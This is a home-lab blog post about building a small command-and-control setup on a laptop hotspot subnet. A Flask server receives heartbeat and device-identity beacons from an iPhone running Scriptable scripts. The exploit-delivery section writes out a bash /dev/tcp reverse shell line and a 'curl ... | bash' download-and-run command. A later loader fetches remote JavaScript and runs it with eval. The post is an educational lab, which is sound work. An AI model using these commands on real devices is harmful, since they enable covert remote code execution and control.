title: "Turn Your Subnet Into a Battlefield - Building a Real Mini C2 Setup"
description: "This blog walks through the second phase of my custom subnet project - building a working mini Command & Control (C2) infrastructure. Use Python's Flask as the controller and an iPhone as the agent, which reports back with heartbeat packets and identity info via HTTP. You'll learn beaconing, payload hosting, agent scripting via Scriptable, and how to simulate real pentest techniques without needing jailbroken devices or external tools. A pure LAN C2 lab."

## üí£ What is **C2** (Command & Control)?

### üß† C2 = **Command and Control Server**

> The brain behind a **botnet**, **reverse shell**, or **remote implant** üß†

> üîó A system where one machine (**the controller**) issues commands and receives responses from another machine (**the agent** or **implant**), usually stealthily and often remotely.

Think of it like:

* üéÆ Controller = Hacker
* üïπÔ∏è Agent = Hacked device, beaconing back to the controller

Used by red teamers, pentesters, and... **real hackers too**:

* üí¨ Victim machine: "Hey C2, I'm online. Got any jobs?"
* üß† C2 server: "Run this script, send me screenshots, keystrokes, etc."

---

### üß† What Makes It a C2?

| Element                       | Meaning                                                                      |
| ----------------------------- | ---------------------------------------------------------------------------- |
| üì° **Communication Channel**  | Could be HTTP, TCP, DNS, reverse shell, VPN, or even USB tether              |
| üó£Ô∏è **One side gives orders** | Controller sends commands (run script, scan network, exfil data)             |
| üëÇ **Other side responds**    | The agent performs and reports back (via HTTP POST, TCP connection, etc.)    |
| üïµÔ∏è **Usually hidden**        | Uses encryption, domain fronting, obfuscation, NAT traversal, etc.           |
| üîÑ **Can be two-way**         | Some advanced C2s allow live shells, file upload/download, persistence setup |

---

So after creating our own subnet, we are just in **Phase 1: Secure Subnet Lab**

You're *not* in a full-blown C2 - yet  
But you're in **C2-capable infrastructure.**  
Like... if you dropped a script on the iPhone that beaconed to laptop every 60s via HTTP or DNS?

üéØ THEN you've got a real C2.

## Mission - Heartbeat Packets

> "Build a tiny HTTP-based agent that checks in to your laptop hotspot and sends heartbeat packets"

### üí° What is a Beacon (in C2)?

In C2 (Command & Control), **beaconing** means:

> ‚úâÔ∏è A client machine (the *agent*) quietly "calls home" to the controller (your laptop) at regular intervals.

This "call" is usually:

* üì° An HTTP/HTTPS request
* üîÇ Repeating every few seconds or minutes
* üïµÔ∏è‚Äç‚ôÄÔ∏è Invisible to the user
* üîç Potentially carrying system info, GPS, files, commands, etc.

So a "heartbeat packet" is a tiny signal like:

```
POST /heartbeat HTTP/1.1
Host: 192.168.66.66
Data: {"status":"alive","device":"iPhone"}
```

---

### ‚úÖ Imagine This Setup

| Component        | Device                                                                                               |
| ---------------- | ---------------------------------------------------------------------------------------------------- |
| **C2 Server** | Your **laptop**, running a simple Python Flask listener (or HTTP server)                               |
| **Agent**     | Your **iPhone**, sending regular HTTP requests (maybe via Shortcuts, app, or browser background tab) |
| **Link**      | Your **hotspot**, custom `/29` LAN                                                          |

Boom. You have a mini C2.

---

### üß™ Simple Python Flask Server (laptop side)

```python
# server.py
from flask import Flask, request

app = Flask(__name__)

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    print(f"[+] Heartbeat from: {data}")
    return "ACK", 200

app.run(host='0.0.0.0', port=9999)
```

### Run it on laptop:

```bash
python3 server.py
```

---

## üì± Now the Agent (iPhone side)

You can use:

* **iOS Shortcuts** to send POST requests every 10s
* Or install `scriptable` from app store - it's JavaScript on iOS with access to networking:

```javascript
let url = "http://192.168.66.66:9999/heartbeat"
let payload = {
  status: "alive",
  device: "iPhone"
}

let headers = {
  "Content-Type": "application/json"
}

let req = new Request(url)
req.method = "POST"
req.headers = headers
req.body = JSON.stringify(payload)

await req.load()
```

>üí° You can even build a Scriptable widget to run this every time you tap it - or schedule with Background refresh, though that's limited on iOS.

Then every time you tap it, you will get:

```bash
[+] Heartbeat from: {'status': 'alive', 'device': 'iPhone'}
192.168.66.68 - - [21/May/2025 11:26:04] "POST /heartbeat HTTP/1.1" 200 -
```

on your laptop terminal.   
And iPhone is now sending back heartbeat packets via HTTP like it's in a blacksite LAN.

## üí£ Exploit Delivery in Pentests

> üí¨ Exploit delivery in pentests - host payloads or reverse shells locally

This refers to a common technique in hacking/pentesting:

### üéØ You (the attacker) host a file on your **own machine** (e.g., now laptop) like:

* A Python payload
* A malicious `.exe` / `.apk`
* A reverse shell script (e.g. `bash -i >& /dev/tcp/192.168.66.66/4444 0>&1`)

And then the target device (iPhone, a victim VM, or anything inside your LAN) **downloads and executes** that payload.

### üî• Real Example You Could Do Now:

```bash
# On laptop
python3 -m http.server --bind 192.168.66.66 8080
```

Then you place `payload.sh` or `shell.py` in that directory.

On the iPhone or another connected device, you could:

```bash
curl http://192.168.66.66:8080/payload.sh | bash
```

‚úÖ BOOM - Exploit delivered. Shell pops back.

This is **literally how Cobalt Strike, Metasploit, and manual red-teamers do it.**

---

## üß† So now laptop becomes the command hub for devices connected to it

### üí¨ What this means:

> You're turning your laptop box into a **local C2 server** that:

* Assigns IPs
* Hosts payloads
* Receives beacon traffic (like heartbeats or data)
* Can issue commands back
* Can redirect, NAT, and isolate

Right now your **hotspot** is a local **Command Hub**.  
Every device (like iPhone) is:

* **NAT'd through you**
* **Receives DHCP leases from you**
* **Can only talk to the internet if you allow it**
* **Can beacon back to you like an agent**

That's what a **C2 Infrastructure** does in real-world red team ops.

---

## ü§î New Mission - Run `whoami` on the agent, and send me the result

## üîç How CAN we simulate `whoami` on iOS?

We **fake it**.

### ‚ùì What "whoami" usually gives:

> Returns current user the system sees as active.

In iOS:

* It'll always be "mobile" or "root" (if jailbroken)
* But you can't get it unless you're inside a true shell

### üîé What we *can* do instead:

| Goal              | Workaround                                          |
| ----------------- | --------------------------------------------------- |
| Get device name   | `Device.name()` or `Device.model()` in Scriptable   |
| Get network IP    | Use URL call to whatismyip, or local interface scan |
| Get location      | `Location.current()`                                |
| Get system status | Battery level, charging, brightness, etc.           |
| Emulate "whoami"  | Return your own agent identity info                 |

---

### üí° Example: Fake `whoami` result from Scriptable

```javascript
(async () => {
  let name = Device.name();
  let model = Device.model();
  let battery = await Device.batteryLevel();

  let whoami = {
    device_name: name,
    model: model,
    battery_percent: Math.floor(battery * 100) + "%"
  };

  let url = "http://192.168.66.66:9999/heartbeat";
  let req = new Request(url);
  req.method = "POST";
  req.headers = {"Content-Type": "application/json"};
  req.body = JSON.stringify(whoami);
  await req.load();
})();
```

We'd expect this will POST:

```json
{
  "device_name": "my iPhone",
  "model": "iPhone 15",
  "battery_percent": "79%"
}
```

Which is a *better than `whoami`* C2 fingerprint. üò∫

üí° This creates an **immediately-invoked async function** - a trick we use all the time in Scriptable to use `await`.

---

#### ‚úÖ Test Flow:

1Ô∏è‚É£ Put the JS file on laptop:

```bash
nano ~/Downloads/fake_whoami.js
```

Paste the fixed code above üëÜ
Save it.

2Ô∏è‚É£ Confirm `http.server` is still serving the file:

```bash
python3 -m http.server 8080 --bind 192.168.66.66
```

3Ô∏è‚É£ Confirm Flask listener is still waiting on port 9999. 

```bash
python3 server.py
```

4Ô∏è‚É£ Run this Scriptable loader on iPhone:

```javascript
let url = "http://192.168.66.66:8080/Downloads/fake_whoami.js";
let req = new Request(url);
let code = await req.loadString();
eval(code);
```

5Ô∏è‚É£ WATCH. THE. FLASK. TERMINAL. POP. OFF:

```bash
[+] Heartbeat from: {'device_name': 'iPhone', 'model': 'iPhone', 'battery_percent': '75%'}
192.168.66.68 - - [21/May/2025 12:24:13] "POST /heartbeat HTTP/1.1" 200 -
```

and meanwhile another terminal with `python3 -m http.server --bind 192.168.66.66 8080` would be like 

```bash
192.168.66.68 - - [21/May/2025 12:24:13] "GET /Downloads/fake_whoami.js HTTP/1.1" 200 -
```
